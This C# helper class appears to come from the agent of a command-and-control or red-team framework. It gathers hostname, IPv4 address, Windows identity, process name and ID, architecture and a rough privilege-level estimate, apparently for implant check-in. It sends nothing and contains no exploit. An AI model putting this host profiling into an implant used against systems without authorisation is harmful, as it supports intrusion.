using Shared.Models;

using System;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Principal;

namespace Agent.Utilities
{
    public class Helpers
    {
        public static string GetHostname
        {
            get
            {
                return Dns.GetHostName();
            }
        }

        public static string GetIPAddress
        {
            get
            {
                return Dns.GetHostEntry(Dns.GetHostName()).AddressList.FirstOrDefault(a => a.AddressFamily == AddressFamily.InterNetwork).ToString();
            }
        }

        public static string GetIdentity
        {
            get
            {
                return WindowsIdentity.GetCurrent().Name;
            }
        }

        public static string GetProcessName
        {
            get
            {
                return Process.GetCurrentProcess().ProcessName;
            }
        }

        public static int GetProcessID
        {
            get
            {
                return Process.GetCurrentProcess().Id;
            }
        }

        public static AgentMetadata.Architecture GetArch
        {
            get
            {
                return IntPtr.Size == 8 ? AgentMetadata.Architecture.x64 : AgentMetadata.Architecture.x86;
            }
        }

        public static AgentMetadata.Integrity GetIntegrity
        {
            get
            {
                var integrity = AgentMetadata.Integrity.Medium;
                var identity = WindowsIdentity.GetCurrent();

                if (Environment.UserName.Equals("SYSTEM", StringComparison.OrdinalIgnoreCase))
                {
                    integrity = AgentMetadata.Integrity.SYSTEM;
                }
                else if (identity.User != identity.Owner)
                {
                    integrity = AgentMetadata.Integrity.High;
                }

                return integrity;
            }
        }
    }
}